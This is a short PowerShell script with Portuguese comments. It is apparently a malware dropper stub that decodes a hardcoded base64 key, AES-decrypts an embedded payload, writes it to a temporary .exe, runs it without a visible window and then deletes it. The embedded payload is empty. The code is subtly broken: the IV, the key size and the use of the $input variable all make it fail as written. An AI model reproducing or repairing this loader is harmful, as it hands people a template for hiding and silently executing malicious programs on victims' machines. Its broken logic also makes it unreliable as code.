
    $obfuscatedKey = 'eU8wMU5ZcjBScTctVGYzYmF0MUNwempzamtlNWcySkJleTdkMnNENW1HUT0='
    $obfuscatedBytes = ''

    function Decode-Base64($input) {
        return [System.Convert]::FromBase64String($input)
    }

    function Decrypt-Bytes($encryptedBytes, $key) {
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key)
        $aes.IV = $aes.IV
        $decryptor = $aes.CreateDecryptor()
        $memoryStream = New-Object System.IO.MemoryStream($encryptedBytes)
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $decryptedBytes = New-Object byte[]($encryptedBytes.Length)
        $cryptoStream.Read($decryptedBytes, 0, $decryptedBytes.Length) | Out-Null
        $memoryStream.Close()
        $cryptoStream.Close()
        return $decryptedBytes
    }

    # Descriptografa a chave
    $key = [System.Text.Encoding]::UTF8.GetString(Decode-Base64($obfuscatedKey))

    # Descriptografa os bytes
    $encryptedBytes = Decode-Base64($obfuscatedBytes)
    $decryptedBytes = Decrypt-Bytes $encryptedBytes $key

    # Executa o arquivo
    $tempFile = [System.IO.Path]::GetTempFileName() + '.exe'
    [System.IO.File]::WriteAllBytes($tempFile, $decryptedBytes)
    Start-Process $tempFile -NoNewWindow -Wait
    Remove-Item $tempFile
    
